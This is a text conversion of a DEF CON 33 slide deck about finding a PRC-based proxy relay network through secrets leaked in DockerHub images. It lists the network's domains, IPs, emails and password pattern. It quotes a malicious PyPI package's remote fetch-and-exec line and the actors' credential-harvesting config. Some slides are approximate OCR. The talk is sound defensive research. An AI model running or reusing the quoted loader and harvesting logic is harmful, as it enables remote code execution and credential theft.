---
title: "Inside Look at Chinese Operational Relay Network"
speakers: ["Michael Torres"]
conference: "DEF CON"
conference_full: "DEF CON 33"
edition: "33"
year: 2025
source_pdf: "DEF CON 33/Michael Torres - Inside Look at Chinese Operational Relay Network.pdf"
pages: 33
sha256: "e84034bb47ec3fb5ad6f3eb42dd36e64cf02b4dcf1966d4a64b72f308cd85430"
text_chars: 15632
ocr_pages: 8
has_ocr: true
redacted_secrets: 0
ocr_confidence: 87.0
ocr_unreliable_blocks: 1
ocr_timeouts: 0
pages_recovered_from_text_layer: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-12T07:07:10Z"
---
# Inside Look at Chinese Operational Relay Network

**Speakers:** Michael Torres  
**Conference:** DEF CON 33  
**Source:** `DEF CON 33/Michael Torres - Inside Look at Chinese Operational Relay Network.pdf` (33 pages)


## Slide 1

# Meeting Mac

Inside Look at a PRC-based Operational Relay Network Zane “earf” Hoffman Michael “mtu” Torres DEF CON 33, August 2025

## Slide 2

## Overview

- Introduction

- Who are we, what did we do, what did we find

- ● Docker Secrets

- Scanning at scale, Git secrets, Finding Mac

- ● Stumbling Into Success - Initial analysis

- ● Fanning Out - database backups, notes, SSH keys ○ Incidental vulnerability research, as a treat

Figure 1 - Mac, when he hears we're burning his relay network

- “Runner” types

- ● Data backup locations

- ● Relay network services

- ● Relay network email addresses, domain names, usernames

- ● Outro

## Slide 3

Introduction - w -h | cut -d’ ‘ -f1 | xargs id

Zane “ear{f, l}” Hoffman

### Michael “mtu” Torres

- A dude

- Another dude

## Slide 4

## Secrets in Docker containers

- Inspired by Docker Exploitation Framework @DEF CON 32, started writing a scanner in our hotel room

- How to containerize an application?

   - Docker says: COPY . ., build, and push

- Often includes files like .env, source code with credentials, or other sensitive data

<u>https://defcon.org/html/defcon-32/dc-32-demolabs.html#54164 https://dockerexploitationframework.github.io/</u>

## Slide 5

## Scanning at Scale

- Scan “most recently updated” DockerHub containers ○ Using DockerHub’s undocumented search API

- ● Regexes for file contents of interest

- TruffleHog is probably better than stubbornly writing your own secret scanner :)

- ● Found data included:

   - API keys for:

      - OpenAI (so, so many OpenAI keys)

      - Binance (mainly from trading bots)

      - Cloud providers (AWS/GCP)

   - Database credentials (including “prod DB writer” for an internet-facing SQL server owned by an online casino)

   - Database backups

- Too much data, too many false positives

## Slide 6

## Scanning at Scale

- Alert/development fatigue is real, leading to many conversations like these


> Recovered by OCR — confidence 92/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Scanning at Scale
e Alert/development fatigue is real, leading
to many conversations like these
always has been
Arbitrary 8/23/2024 3:46 PM
Aight
Lemme know when you're back we can get it fixed nice
enough to get it running again if you want
mtu 8/23/2024 3:46 PM
if you want one of us can work on that search -> scan
pipeline
Arbitrary 8/23/2024 3:47 PM
Yea that’s what | figured
Pll try and optimize this fucker with your suggestions
Maybe get the next working again
mtu_ 8/23/2024 3:47 PM
I'm only doing it for an hour then | got heads to click
Arbitrary 8/23/2024 3:47 PM
Yea that’s fair
```

## Slide 7

## Scanning at Scale

- In the middle of our initial testing, Docker rolled out API limits coincidentally the same as the rate we were hitting (sorry <3)

   - Rate limit has since been rolled back

<u>https://www.docker.com/blog/november-2024-updated-plans-announcement/</u>

## Slide 8

## Scanning at Scale

….what if?


> Recovered by OCR — confidence 85/100 on the text kept, 73/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Scanning at Scale
....what if?
»2 broweshould check for
Zits and then we can
probably yoink the url
from it and check if its
private
a Truuuu
```

## Slide 9

## Git Secrets and why you shouldn’t COPY . .

- With no .dockerignore, COPY . . includes Git metadata

   - Leaked Git metadata has been used by others to great effect in <u>bug bounties (50k)</u> and by <u>other bad guys</u>

- Docker build && push CI jobs in GitHub/GitLab include the job token ○ Tokens expire when the job finishes (or close enough)

   - Exploitable race condition if the job runs for large amounts of time after docker image push - for example, if one job is pushing multiple containers.

<u>https://docs.docker.com/get-started/workshop/02_our_app/</u>

## Slide 10

Demo - CI Action Secret Leak Exploit

## Slide 11

## Git Secrets

- Metrics

   - 81,227 containers scanned in ~3 months

   - 15,254 unique containers contained Git metadata (19% of containers)

   - 1,488 “hits” for non-public Git repos (10% of discovered repos, 2% of scanned containers) ■ 499 unique repos

      - Non-public means:

         - 404/400s on public sites (GitHub/GitLab/BitBucket/Gitee)

         - Connection timeout for private Git servers (git.$COMPANYNAME.com)

- Notables

   - “Enterprise” branches of Apache open source projects

   - Russian dash cam manufacturer

   - Security vendor’s private detection rules

   - None of the above ever responded to our disclosures ):

      - Even when we sent it to the last email in git log

## Slide 12

Git Secrets - Fancy Charts of Findings

## Slide 13

## Finding Mac

- One DockerHub user, “Mac”, was updating multiple public images ~daily or more

- Docker containers as free cloud storage? Sure, why not

- ● Private Git repos in backups

- Led to other DockerHub users doing the same

- ● In total:

   - 3 users

   - 38 repositories (user/containername)

   - Hundreds of container images (user/containername:tag)

   - A lot of data

## Slide 14

Stumbling Into Success


> Recovered by OCR — confidence 88/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Stumbling Into Success
10:40 PM mtu so uh
mtu that family of containers
mtu it looks a lot like someone that uh
mtu is spinning up and down infrastructure to proxy other traffic through
mtu Vercel, Fly, HuggingFace
mtu interconnected via a tailscale network
mtu_ primary endpoint is then "gw-tsnet.devxops.eu.org -> vps-ali2"
mtu hairpins some traffic through hxxp://forward.devxops.eu.org:49192 (<cit=s)
mtu error that gives is "Illegal blocking 690" in chinese...
mtu which redirects to great firewall of china generic error page hxxp://114.115.192.246:9080/error.html
mtu
```

## Slide 15

Introduction - What Did We Find


> Recovered by OCR — confidence 88/100 on the text kept, 76/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Introduction - What Did We Find
Bolded compute types
are the most prevalent
a Teracloud
serv00 VPS SAP VM HuggingFace
Reverse Tunnel using
frp, revsere-ssh, and nps/npc
Each "runner" has a 3 digit ID —_
Nps forwards ports $IDxx to the 4
runner
Tunnel Hub
Huawei VM
```

## Slide 16

## What Did We Find

- High confidence:

   - PRC-based “Operational Relay Box (ORB) Network”

      - <u>https://cloud.google.com/blog/topics/threat-intelligence/china-nexus-espionage-orb-netw orks</u>

      - TLDR: Proxy machines for bad actors

- More than one person involved in development and operations ■ Observed messages between two personas in notes (.rec files, no it’s not GNU recutils)

- ○ In development since 2022 (Earliest commit is October 2022)

- ● Medium confidence:

   - Used to proxy web traffic, manage social media accounts, and otherwise do anonymous browsing

- Low confidence:

   - Used for malicious activity

      - <u>One malicious PyPi package, One CobaltStrike listener log</u>

## Slide 17

## Network Tunneling Protocols

- nps ( <u>https://github.com/ehang-io/nps/tree/master)</u> used for node-hub C2

- ● Modifying frp fingerprint ( <u>https://github.com/fatedier/frp)</u> by changing all key names

- Use <u>https://playit.gg/,</u> TailScale, CloudFlare Tunnels to obscure C2 destination IPs

- “Multi-cloud” runners

   - Full VMs

   - Co-opted serverless compute

   - Co-opted DevOps tooling  (GH actions, GCS)

Script showing automated mutation of FRP fingerprint

## Slide 18

## Network Infrastructure

- “Hub” domain names:

   - nps.devxops[.]eu.org

   - hk3.devxops[.]eu.org

   - rn.devxops[.]eu.org

- “Private” services

   - gh.note4[.]eu.org ■ Provides web access to their GitHub repos

   - fhost.devxops[.]eu.org

      - File hosting (scripts, tools, etc)

   - node-{us, hk}.devxops[.]eu.org

      - “Workstations” running RDP

- Misc

   - devxops[.]tk ■ ms.devxops[.]tk:7004/cobaltstrike4.0-cracked.zip

   - ○ hw.52umall.top

   - “Huawei VPS” (vscode-remote://hw2.52umall.top:33598)

   - ○ 116.205.173.139:5000 - “vps-hw2”

## Slide 19

## Data Persistence

- Data saved to:

   - Teracloud.jp (WebDAV)

   - ○ DockerHub images

   - Github Repositories

   - HuggingFace

   - Backblaze (B2)

   - OneDrive

## Slide 20

## Data Persistence - Additional Info

● Decoding the OneDrive JWT, we get some metadata about the requestor


> Recovered by OCR — confidence 79/100 on the text kept, 60/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
Data Persistence - Additional Info
e Decoding the OneDrive JWT, we get some metadata about the requestor
"iat": 1611829733, appid": “c49f@b3d-4f28-42f1-9816-ffbc@@3e6be5",
“nbf": 1611829733, “appidacr": "1",
"exp": 1611833633, ns " "
idtyp": “user”,
“upn": "2@2@000017@host.ac.cn", “platf": “S",
“wids": [ "rh": "@.AAAAnNOzjVZ1Mz@SR1pYOrYY7GT@Ln8QoT_FCmBb
"b79fbf4d-3ef9-4689-8143-76b194e85509" "scp": "Files.Read Files.Read.All Files.ReadwWrit
1, "signin_state": [
```

## Slide 21

## Credentials

- SSH private keys for root user, including list of hosts they’re for

- Passwords

   - Follow a standard: ab*0@$LETTER

   - E.g. tmp0230:ab*0@T, coral86:ab*0@CO

   - md5(“zaneandmichaelsittinginatree” + tmp0230’s password) == 51843cbe3026f39b2fe58d7236e1e38f

      - GLHF :)

   - Applies to emails, <u>eu.org</u> domain accounts, and basically just every type of account

## Slide 22

## More Credentials

- API keys for:

   - Heroku (27)

   - Github (25)

   - HuggingFace (13)

   - Upstash (9)

   - Render (7)

   - Supabase (4)

   - CloudFlare (2)

   - Teracloud (2)

   - Gitlab (2)

   - Fly.io (2)

   - Backblaze (1)

   - Groq (1)

   - xAI (1)

## Slide 23

## Even More Credentials

- Emails

   - At least 50, with large prevalence of gmail/outlook

   - Honestly, there’s too many for us to pull out of all our notes to count

   - Top frequent ones:

      - macbook3pro@gmail.com

      - tmp0230@o2.pl && tmp0230@gmail.com

      - coral-86@outlook.com

      - snake8cmask@gmail.com

      - cs4xack@gmail.com

      - feapder3sk@gmail.com

   - Not including tooling to create new ones

- Social Media

   - Twitter (2)

   - Facebook (2)

The only activity on one of the Twitter accounts

## Slide 24

## Somehow, even more credentials (as a service)

● API to fetch credentials from object storage


> Recovered by OCR — confidence 84/100 on the text kept, 78/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Somehow, even more credentials (as a service)
e API to fetch credentials from object storage
_CRED_CONFIG=$(cat << 'EOF'
"$3 CRED_EXT": {
"*/gcloud": "tar.gz",
"*/aws": "tar.gz",
"*/azure": "tar.gz",
"*/desktop": "tar.gz",
"*/fios": "tar.gz",
"*/browser/cookies": "json",
"*/browser/cookie": "json",
"*/browser/fingerprint": "json",
"*/browser/state": "json",
"*/oauth2/gmail": "json",
"*/oauth2/gdrive": "json",
"*/oauth2/token": "json",
"google/oauth2": "json",
"telegram/logs": "json",
"wechat/logs": "json"
```

## Slide 25

## Services Offered

- Organized into “Work Groups”

- ● “Social”

   - Headless Chrome

- “Ops”

   - VS Code Web

   - ttyd

- “Scraper” ○ Recursive cloning of websites

- ● All nodes:

- SSH

- VNC

## Slide 26

## Services Offered - Port Forwarding

- Central hub (NPS server) forwards ports

- ● Pattern: {$NODEID}XX:

   - 22 - SSH

   - 51 - VNC

   - 59 - VNC

   - 69 - noVNC

   - 78 - ttyd

   - 80 - ttyd

   - 90 - GFW bounce? (Server: ADM/2.1.1)

   - 91 - pproxy API (returns list of proxies)

## Slide 27

## Node Numbering

Runner nodes follow a consistent naming pattern (according to their notes, anyway)


> Recovered by OCR — confidence 89/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Node Numbering
Runner nodes follow a consistent naming pattern (according to their notes,
anyway)
tags: #
server, wx ...
source_args: (type: docker / repo / ... )
BASE:
ENV: #
CMD:
platform.
"token
gs: ( or list with [] or selector func @xxx with filter )
1 Ops
: chrome, social
20241028: ops-config
config$ cat README.md
about id for runner:
cloud:
FLY 40x / HUG 42x / ACT 44x/ SAP 46x / ... GOOGLE / 45x KAG(GPU) / 48x
vps:
NET 50x / WIN 52x / SERV 54x / ...
lan:
ROUTER 10x / PC 12x / PHONE 14x / IOT 16x ...
work_groups=(wg_network wg_chrome wg_devops wg_xack_v1 wg_tmp)
for group in $work_groups; do
wget https: //fhost .devxops.eu.org/devops/cicd/inits-v3/workgroup/$group.sh;
done
wg_network=(3@0-899)
wg_chrome=(312 313 420-429)
wg_devops=(320-399 326 300)
wg_xack_v1=(344)
wg_tmp=(411-419)
```

## Slide 28

## Malicious PIP Package

- ptmpl, preserved on VirusTotal

- ● Downloads script from fhost.devxops[.]eu.org and runs it

- ● exec(requests.get('https://funcaptcha[.]ru/paste2?package=requst ss').text.replace('<pre>','').replace('</pre>',''))

## Slide 29

## Accidental 0day discovery, as a treat

- Some nodes run BaoTa Panel (btPanel)

   - PRC-native web admin panel with >20M installs

- Python Flask web app

- Vuln 1&2, MITM => RCE as Root

   - Downloads a PAM module over HTTP; Attacker can insert a malicious PAM module

      - <u>https://blog.sectorr.dev/PAM-Implant/</u>

      - Patched after blog post

   - Update script fetches shell scripts, rpms, tarballs over HTTP, runs as root ■ Still not patched as of 8 July

- Vuln 3, Improper MFA

   - Same TOTP secret is used for all web users

   - Static “OTP” is used for all SSH users

   - Not patched

- Memory unsafe stuff, probably

   - Multiple C functions do stuff with user input and stack memory they probably shouldn’t

<u>https://ssd-disclosure.com/ssd-advisory-btpanel-mfa-bypass/</u>

## Slide 30

## Vibe Coding - Not just for web apps

- Lots of database/chat logs with LLMs for assistance in building the thing

- Since they used the proxy network, they could get around IP geolocation blocks from China

- ● Some in Simplified Chinese, some in English

- Low amounts of evidence suggesting specifically Cursor was used

## Slide 31

Vibe Coding - Not just for web apps


> Recovered by OCR — confidence 92/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Vibe Coding - Not just for web apps
tgpt: @813 macbook3
some time i need to schedule or maintain batch objects , such as acounts of diffe
so ineed a pool solution pythonic to handle such scenes
‘the solution can let me very convenient to get the object item flexible #
2. all the pool item data will store on redis
3. the pool inte should support handle some maintain job for item, for ex ,
also need to check the counts of the pool regular ,
5. the soluton should pythonic and object orient
Jess then min , it wil
may need some base or abstrac
btw , iwill open a new chat to focus on make automation script with chrome client for platfroms|
like google facebook tiktok xiaohongshu .... to deal common job like register , like , post
Please analyze and design the patch solution with the following hack-friendly approach:
good, further more
follow requires:
item support tags , that can be filter by the pool
maybe maintain the status
3. output log for neccessory and * actions
4. seletion algorithms also support base on different statistics from
any other u think is neccessory and convenient to use for the pool
i think need a better logging mechanism that can Implement methods to
how about loki , that can analyze and statistics the logs in realtime
item, f using , free , maintainng inavail
history log
analyze his
can u gv me system promopts or cursorrules for better dealing on such jobs
further more , does cursor support multi cursorrules for different directories
Yes! Here's a suggested system for handling social media automation scripts:
Directory Structure and Cursor Rules:
Jautomation_s
- Patch Overview
Target feature/function to add
Current project version
- Minimal changes needed
= Quick implementation approach
2. Patch Points Analysis
Possible injection points
* Hook points in existing code
* Event/callback opportunities
* Existing extension mechanisms
Minimal impact locations
~ Backup/restore considerations
- Implementation Strategy
Least intrusive approach
* Monkey patching opportunities
* Runtime injection possibilities
* Configuration overrides
No/minimal original file changes
Temporary vs. permanent considerations
Code Location References
Format: file.go:1ine_number
Example:
main.go:5@: hook point
~ server.go:1@8: injection location
```

## Slide 32

## Outro

- Last update to a “Mac” container was 20 June, 2025 ○ Included new GitHub repos, new email addresses

- ● Takeaways

   - Public docker containers contain lots of juicy secrets ■ Without a .dockerignore, COPY . . is a risky Containerfile directive

      - Reported to Docker 19 Feb

      - ■ Default GitHub/GitLab/Bitbucket/Gitee CI jobs drop credentials into .git/config

   - Reported to GitHub/GitLab 19 Feb, recommended to use environment variables instead of placing credentials in a file. No response.

- People are using cloud platforms to build scalable proxy networks for questionable purposes

## Slide 33

## Questions, Comments, Concerns?

- Michael <michael at sectorr.dev>

- Zane <zane at hoffnet.dev>
